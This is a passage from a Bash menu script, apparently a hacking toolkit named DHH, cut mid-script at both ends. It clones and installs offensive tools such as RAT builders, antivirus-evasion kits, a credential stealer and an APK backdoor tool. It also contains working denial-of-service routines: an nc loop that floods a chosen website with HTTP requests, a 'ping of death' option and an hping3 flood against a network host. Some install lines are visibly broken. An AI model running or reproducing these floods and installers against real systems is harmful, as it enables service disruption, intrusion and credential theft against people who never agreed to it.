echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "==========install unicorn for you========== "
sleep 4
echo "[*]working......."
sleep 1
git clone https://github.com/trustedsec/unicorn.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $rr = 4 ];then
clear
echo 
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=========install venom for you=========="
sleep 4
echo "[*]working........"
sleep 1
git clone https://github.com/r00t-3xp10it/venom.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $rr = 5 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=======install TheFatRat for you==========="
sleep 4
echo "[*]working........"
sleep 1
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat/
chmod +x setup.sh
./setup.sh
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DDH.sh
else
if [ $rr = 6 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=====install ezsploit-freamework for you====="
sleep 4
echo "[*]working......."
sleep 1
git clone https://github.com/rand0m1ze/ezsploit.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $rr = 7 ];then
clear
echo
echo "" $GREEN
echo -n "Do you want to install Veil-Evasion ? [Y/N] : $RED"
			read install
		if [[ $install = Y || $install = y ]] ; then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo	
				echo $RED"============ Install Veil-Evasion for you ================"
sleep 4
echo "[*]working........"
sleep 1
				
				git clone https://github.com/Veil-Framework/Veil-Evasion.git 
				cd Veil-Evasion/setup
				./setup.sh -s
                                cd ..
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
			else

if [[ $install = N || $install = n ]] ; then
clear
./DHH.sh
fi
fi			
else
if [ $rr = 8 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=====install pupy for you====="
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/n1nj4sec/pupy.git
cd /pupy/pupy/
pip install -r requirements.txt
echo $GREEN"Finishing......"
sleep 7
clear
./DHH.sh
else
if [ $rr = 9 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=====install Brutal for you====="
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/Screetsec/Brutal.git
echo $GREEN"Finishing......"
sleep 7
clear
./DHH.sh
else
if [ $rr = 10 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========install kimi for you========"
sleep 4
echo "[*]working......."
sleep 1
git clone https://github.com/ChaitanyaHaritash/kimi.git
echo $GREEN"Finishing......"
sleep 7
clear
./DHH.sh
else
if [ $rr = 11 ];then
clear
echo
echo "" $GREEN
echo -n "Do you want install Shellter ? [Y/N] :$RED "
			read install
			if [[ $install = Y || $install = y ]] ; then	
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
				echo "==========install Shellter for you============="
sleep 4
echo "[*]working......."
sleep 1
				
				apt-get -y install shellter
echo $GREEN"Finishing......"
sleep 7
clear
./DHH.sh
			else
				if [[ $install = N || $install = n ]] ; then
clear 
./DHH.sh
			fi
	                fi
else
if [ $rr = 12 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "==========install Avoid for you============="
sleep 4
echo "[*]working......."
sleep 1
rm -rf /opt/BypassAV/Avoid/
git clone https://github.com/nccgroup/metasploitavevasion.git
echo $GREEN"Finishing......"
sleep 7
clear
./DHH.sh
else
if [ $rr = 13 ];then
clear
echo
echo "" $GREEN
echo -n "Do you want install netripper [Y/N] :$RED  "
read install
	if [[ $install = Y || $install = y ]] ; then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo	
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
				echo "============install netripper for you============"
                                sleep 4
                                echo "[*]working......."
                                sleep 1
				git clone git clone https://github.com/NytroRST/NetRipper.git /opt/exploitation/Network/netriper/Metasploit
				cd /opt/exploitation/Network/netriper/Metasploit
				cp netripper.rb /usr/share/metasploit-framework/modules/post/windows/gather/netripper.rb
				mkdir /usr/share/metasploit-framework/modules/post/windows/gather/netripper
				g++ -Wall netripper.cpp -o netripper
				cp netripper /usr/share/metasploit-framework/modules/post/windows/gather/netripper/netripper
				cd ../Release/
				cp DLL.dll /usr/share/metasploit-framework/modules/post/windows/gather/netripper/DLL.dll
				echo $GREEN"[*]Finishing....."
                                sleep 7
                                clear
                                ./DHH.sh
			else

				if [[ $install = N || $install = n ]] ; then
clear
./DHH.sh
			fi
                        fi
else
if [ $rr = 14 ];then 
clear
echo 
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=======install LaZagne for you==========="
sleep 4
echo "[*]woking......."
sleep 1
git clone https://github.com/AlessandroZ/LaZagne.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh   
else
if [ $rr = 15 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========== install NXcrypt for you =========="
sleep 4
echo "[*]working.........."
sleep 1
git clone https://github.com/Hadi999/NXcrypt.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else 
if [ $rr = 16 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========== install KatanaFramework for you ==========="
sleep 4
echo "[*]working..........."
sleep 1
git clone https://github.com/PowerScript/KatanaFramework.git
cd KatanaFramework/
chmod +x *
./install
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else       
if [ $rr = 17 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=========install kwetza-Android========"
sleep 4
echo "[*]working.........."
sleep 1
git clone https://github.com/sensepost/kwetza.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $rr = 18 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=======install backdoor-APK========"
sleep 4
echo "[*]working........ "
sleep 1
git clone https://github.com/dana-at-cp/backdoor-apk.git
echo $GREEN"[*]Finishing....."
sleep 7
else
if [ $rr = 19 ];then
clear
./DHH.sh
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
else
if [ $word = 8 ];then
clear
echo
echo "" $GREEN
cat << !

	
###################################
 welcome!$RED
 
╔╦╗╔╦╗╔═╗╔═╗  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═
 ║║ ║║║ ║╚═╗  ╠═╣ ║  ║ ╠═╣║  ╠╩╗
═╩╝═╩╝╚═╝╚═╝  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩$GREEN                         

###################################$RED 
              
  D DENIAL OF SERVICE ATTACK !
----------------------------$GREEN
1 $BLUE > Attack On Website $GREEN 
2 $BLUE > PING OF DEATH ATTACK $GREEN
3 $BLUE > Attack in Network $GREEN

4 $BLUE >${RED} Back to the menu$GREEN  
!
echo ""$BLUE
echo "##############################"
echo "" $GREEN
echo -n "Enter choice ->> "$BLUE
read choice
if [[ $choice = '' ]];then
clear
./DHH.sh
else
if [ $choice = 1 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
{ echo "" $GREEN
echo -n "Enter target site : "$RED
	read -i $TARGET -e TARGET
echo "" $BLUE
echo "Target= >> $TARGET <<"
echo
echo "" $GREEN
echo -n "Enter target port : $BLUE (default port (80) :> "$RED
	read -i $PORT -e PORT
echo "" $BLUE
	: ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Port= >> $PORT << "
	fi
echo
echo "" $GREEN
echo -n "Enter the number of attacks : $BLUE(default 2500) :> "$RED
	    read CONNS
	: ${CONNS:=2500}
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
CONNS=2500 && echo "Invalid integer!  Using 2500 connections"
	fi
echo
echo
echo "" $GREEN
echo "Press Enter to attack on $BLUE[[$RED>$BLUE $TARGET $RED<$BLUE]]"
	read INTERVAL
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]
then

INTERVAL=$((RANDOM % 11 + 5))

	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
then

INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
	fi



clear
echo 
echo
echo $GREEN"Attack has been started on $BLUE [[$RED>$BLUE $TARGET $RED<$BLUE]]"
sleep 3
echo ""$RED
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Attcking start on $BLUE $TARGET$RED..........$GREEN $i,$RED $INTERVAL "; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
echo
echo "" $BLUE
echo "The attack was completed on [[$RED>$GREEN $TARGET $RED<$BLUE]]$RED >>$BLUE $CONNS $RED attacks Done <<"
echo
echo "" $GREEN
read -p "press Enter to back to the menu "
echo
clear
./DHH.sh
}
else
if [ $choice = 2 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo "" $GREEN
echo -n "Enter Target Site -> :$RED "
read target
sleep 1
echo "" $GREEN
echo "TARGET==>$BLUE $target "
sleep 1
echo 
echo "" $GREEN
echo "============================"
echo
echo
echo -n "CHOOSE PACKET SIZE :$RED "
read size
sleep 1
echo
echo "" $GREEN
echo "SIZE==>$BLUE $size "$GREEN
sleep 1
echo
echo
echo "============================"
echo
echo
echo -n "HOW MANY PACKETS TO SEND :$RED "
read send
sleep 1
echo
echo "" $GREEN
echo "SEND==>$BLUE $send "$GREEN
sleep 3
echo
echo "============================"$RED
clear
echo
echo "ATTACK HAS BEEN STARTED ON [>$GREEN $target$RED <]"
sleep 2
xterm -T "DHH - press [ctrl+c] to Stop [ping of death Attack]" -geometry 110x23 -e "ping -i 01  -c $send -s $size $target && clear && echo && echo && echo [ATTACK completed ! ON $target ] && sleep 5 "
clear
./DHH.sh
else
if [ $choice = 3 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo "" $GREEN
echo -n "Enter Target ip in your network example: 192.168.1.100 :>  "$RED
read target
clear
echo "" $GREEN
echo "Attack has been started on$BLUE [[$RED> $target $RED<$BLUE]]"$RED
sleep 3
xterm -T "DHH.sh - ATTACK - IN Network" -geometry 99x23 -e "hping3 $target --flood"
clear
./DHH.sh
else
if [ $choice = 4 ];then
clear
./DHH.sh
fi
fi
fi
fi
fi
##END Attacking!!##
else
if [ $word = 9 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 2
clear
echo
echo
echo ""
echo $RED"                   **************************************";
echo $RED"                   *    1.  WHOIS Target                *";
echo $RED"                   *    2.  Dig and host list           *";
echo $RED"                   *    3.  TCP traceroute              *";
echo $RED"                   *    4.  DNS enumeration             *";
echo $RED"                   *    5.  DNS RECON                   *";
echo $RED"                   *    6.  Fierce                      *";
echo $RED"                   *    7.  Nmap                        *"; 
echo $RED"                   *    8.  Enumerate ALL               *"; 
echo $RED"                   *    9.  back to menu                *"; 
echo $RED"                   **************************************";
echo "" $BLUE
echo -n " Enter choice -->> "$RED
read menuoption
echo
if [ $menuoption = 1 ]; then
echo
echo "" $GREEN
echo -n "Enter target domain EG. domain.org[:>"$RED
read target
clear
echo "" $BLUE
whois $target
echo "" $RED
echo "=============Done!==============="
sleep 2
echo
read -p $GREEN"Please press ENTER to return to the menu"
echo
echo
clear
./DHH.sh
else

if [ $menuoption = 2 ]; then
echo
echo "" $GREEN
echo -n "Enter target domain EG. domain.org[:>"$RED
read target
echo "" $BLUE
dig $target any
echo ""
echo ""
echo "" $BLUE
host -l $target
echo "" $RED
echo "=============Done!==============="
sleep 2
echo
read -p $GREEN"Please press ENTER to return to the menu"
echo
echo
clear
./DHH.sh
else
if [ $menuoption = 3 ]; then
echo
echo "" $GREEN
echo -n "Enter target domain EG. domain.org[:>"$RED
read target
echo ""
echo ""
echo "" $BLUE
tcptraceroute -i $intarconn $target
echo "" $RED
echo "=============Done!==============="
sleep 2
echo
read -p $GREEN"Please press ENTER to return to the menu"
echo
echo
clear
./DHH.sh
else
if [ $menuoption = 4 ]; then
echo
echo "" $GREEN
echo -n "Enter target domain EG. domain.org[:>"$RED
read target
echo "" $BLUE
dnsenum  --enum -f dns.txt --update a -r $target
echo "" $RED
echo "=============Done!==============="
sleep 2
echo
read -p $GREEN"Please press ENTER to return to the menu"
echo
echo
clear
./DHH.sh
else
if [ $menuoption = 5 ];then
echo
echo "" $GREEN
echo -n "Enter target domain EG. domain.org[:>"$RED
read target
echo "" $BLUE
dnsrecon -t std -d $target
echo "" $RED
echo "=============Done!==============="
sleep 2
echo
read -p $GREEN"Please press ENTER to return to the menu"
echo
echo
clear
./DHH.sh
else
if [ $menuoption = 6 ]; then
echo
echo "" $GREEN
echo -n "Enter target domain EG. domain.org[:>"$RED
read target
echo "" $BLUE
fierce -dns $target
echo "" $RED
echo "=============Done!==============="
sleep 2
echo
read -p $GREEN"Please press ENTER to return to the menu"
echo
echo
clear
./DHH.sh
else
if [ $menuoption = 7 ]; then
echo
echo $BLUE"Enter target domain EG. domain.org"$RED
echo
read target
echo "" $BLUE
nmap -PN -n -F -T4 -sV -A -oG $target.txt $target
echo "" $RED
echo "=============Done!==============="
sleep 2
echo
read -p $GREEN"Please press ENTER to return to the menu"
echo
echo
clear
./DHH.sh
else
if [ $menuoption = "8" ]; then
clear
echo
echo
echo "" $GREEN
echo -n "Enter target domain EG. domain.org[:>"$RED
read target
echo "" $BLUE
echo ""
whois $target
echo ""$RED
echo "##########################################################################################"
echo "" $BLUE
dig $target any
echo ""$RED
echo "##########################################################################################"
echo "" $BLUE
host -l $target
echo ""$RED
echo "##########################################################################################"
echo "" $BLUE
tcptraceroute -i $intarconn $target
echo ""$RED
echo "##########################################################################################"
echo "" $BLUE
dnsrecon -t std -d $target
echo ""$RED
echo "##########################################################################################"
echo ""$BLUE
dnsenum --enum -f dns.txt --update  a -r $target
echo ""$RED
echo "##########################################################################################"
echo "" $BLUE
dnstracer $target
echo ""$RED
echo "##########################################################################################"
echo "" $BLUE
fierce -dns $target
echo ""$RED
echo "##########################################################################################"
echo "" $BLUE
lbd $target
echo ""$RED
echo "##########################################################################################"
echo "" $BLUE
listres http://www.$target
echo ""$RED
echo "##########################################################################################"
echo "" $BLUE
nmap -PN -n -F -T4 -sV -A -oG $target.txt $target
echo ""$RED
echo "##########################################################################################"
echo "" $BLUE
amap -i $target.txt
echo ""
echo ""
sudo apt-get -y install httprint
echo ""$GREEN
echo "##########################################################################################"
echo ""
echo "" $RED
httprint -h www.$target -s signatures.txt -P0
echo ""
echo "" $BLUE
echo "###################################### Done ALL  ##########################################"
sleep 2
echo
read -p $GREEN"Please press ENTER to return to the menu"
echo
echo
clear
./DHH.sh
else
if [ $menuoption = 9 ]; then
clear
./DHH.sh
fi
fi
fi
fi
fi
fi
fi
fi
fi
else
if [ $word = 10 ];then
clear
echo
cat << !

$RED
  _____   ___   ____  ____      __  __ __  _____ ____  _       ___  ____  ______ 
 / ___/  /  _] /    ||    \    /  ]|  |  |/ ___/|    \| |     /   \|    ||      |
(   \_  /  [_ |  o  ||  D  )  /  / |  |  (   \_ |  o  ) |    |     ||  | |      |
 \__  ||    _]|     ||    /  /  /  |  _  |\__  ||   _/| |___ |  O  ||  | |_|  |_|$BLUE
 /  \ ||   [_ |  _  ||    \ /   \_ |  |  |/  \ ||  |  |     ||     ||  |   |  |  
 \    ||     ||  |  ||  .  \\      ||  |  |\    ||  |  |     ||     ||  |   |  |  
  \___||_____||__|__||__|\_| \____||__|__| \___||__|  |_____| \___/|____|  |__|$GREEN  
                                                                                 
!

echo "This module looks for gaps in systems :) "
echo
echo -n "Enter system or any to find exploit :>$RED "
read sys
sleep 1
if [[ $sys = '' ]];then
echo
echo "Nothing entered !! "
echo 
exit
fi
gnome-terminal --maximize -t "DHH -Seachsploit" --working-directory=WORK_DIR -x bash -c "searchsploit $sys; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
clear
./DHH.sh
else
if [ $word = 11 ];then
clear
sudo perl fap.pl
else
if [ $word = 12 ];then
clear
sudo python wlg.py 
echo
echo "" $BULE
read -p "press enter to back to menu "
echo
clear
./DHH.sh
else
if [ $word = 13 ];then
clear
echo ""
echo
echo $GREEN
echo "====================================================================================="
echo "                                                                                     " 
echo "                                                                                     "
echo "                                                                                     "$RED
echo "        ___   __    _  _______  _______    _______  _______  _______                 "
echo "       |   | |  |  | ||       ||       |  |       ||   _   ||       |                "
echo "       |   | |   |_| ||    ___||   _   |  |    ___||  |_|  ||_     _|                "
echo "       |   | |       ||   |___ |  | |  |  |   | __ |       |  |   |                  "
echo "       |   | |  _    ||    ___||  |_|  |  |   ||  ||       |  |   |                  "
echo "       |   | | | |   ||   |    |       |  |   |_| ||   _   |  |   |                  "
echo "       |___| |_|  |__||___|    |_______|  |_______||__| |__|  |___|                  "
echo "                                                                                     "$GREEN
echo "====================================================================================="
echo "                         INFORMATION GATHERING TOOLS                                 "
echo "=====================================================================================" $BLUE
echo ""
echo "  1)install RED HWOK  ""     3)install Pybelt     ""     5)install golismero              ";
echo "  2)install sn1per    ""     4)install Infoga     ""     6)install NMAP                   ";
echo 
echo "  7)install dmitry    ""     9)install maltegoce  ""     11)install sparta                ";
echo "  8)install recon-ng  ""    10)install nikto      ""     12)install operative             ";
echo 
echo "  13)install AngryFuzzer ""                                                               ";
echo "  14)install RECONDOG    "" 15)back to the menu                                           "; 
echo 
echo ""$RED
echo -n "Enter choice ->> "$BLUE 
read co
echo
if [[ $co == '' ]];then
clear
./DHH.sh
else
if [ $co = 1 ];then 
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========install RED HWOK for you========"
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/Tuhinshubhra/RED_HAWK.git
echo
echo $GREEN"[*]Finishing......"
sleep 7
clear
./DHH.sh
else
if [ $co = 2 ];then 
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "======install sn1per for you==========="
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/1N3/Sn1per.git
cd Sn1per/
chmod +x install.sh
./install.sh
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $co = 3 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "==========install Pybelt for you========="
sleep 4
echo "[*]working........"
sleep 1
git clone https://github.com/Ekultek/Pybelt.git
cd Pybelt/
chmod +x requirements.txt
pip install -r requirements.txt
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $co = 4 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=======install Infoga for you========"
sleep 4
echo "[*]working......."
sleep 1
git clone https://github.com/m4ll0k/Infoga.git
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $co = 5 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "==========install golismero for you=========="
sleep 4
echo "[*]working......."
sleep 1
                                rm -rf /opt/vulnerability-analysis/WebApp/golismero/
				git clone  /opt/vulnerability-analysis/WebApp/golismero/
				cd /opt/vulnerability-analysis/golismero/
				apt-get -y install python2.7 python2.7-dev python-pip python-docutils git perl nmap sslscan
				pip install -r requirements.txt
				pip install -r requirements_unix.txt
				ln -s /opt/vulnerability-analysis/WebApp/golismero/golismero.py /usr/bin/golismero
                                echo $GREEN"Finishing....."
                                sleep 7
                                clear
                                ./DHH.sh
else
if [ $co = 6 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=========install NMAP for you=========="
sleep 4
echo "[*]working........"
sleep 1
sudo apt-get -y install nmap 
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $co = 7 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "======install dmitry for you======"
sleep 4
echo "[*]working........"
sleep 1
sudo apt-get -y install dmitry 
echo $GREEN"Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $co = 8 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
